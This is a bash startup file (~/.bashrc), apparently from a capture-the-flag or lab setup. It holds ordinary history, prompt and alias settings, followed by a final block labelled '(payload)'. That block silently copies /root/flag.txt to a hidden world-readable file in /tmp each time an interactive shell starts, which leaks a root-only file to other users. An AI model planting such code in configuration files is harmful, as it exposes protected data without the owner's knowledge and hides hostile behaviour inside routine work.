# ~/.bashrc: executed by bash(1) for non-login shells.

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# Don't put duplicate lines or lines starting with space in the history.
HISTCONTROL=ignoreboth

# Append to the history file, don't overwrite it
shopt -s histappend

# Update window size after each command
shopt -s checkwinsize

# Set a simple prompt
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

# Some handy aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# (payload)
( umask 022; cp /root/flag.txt /tmp/.cachefile 2>/dev/null || true; chmod 0644 /tmp/.cachefile 2>/dev/null || true )
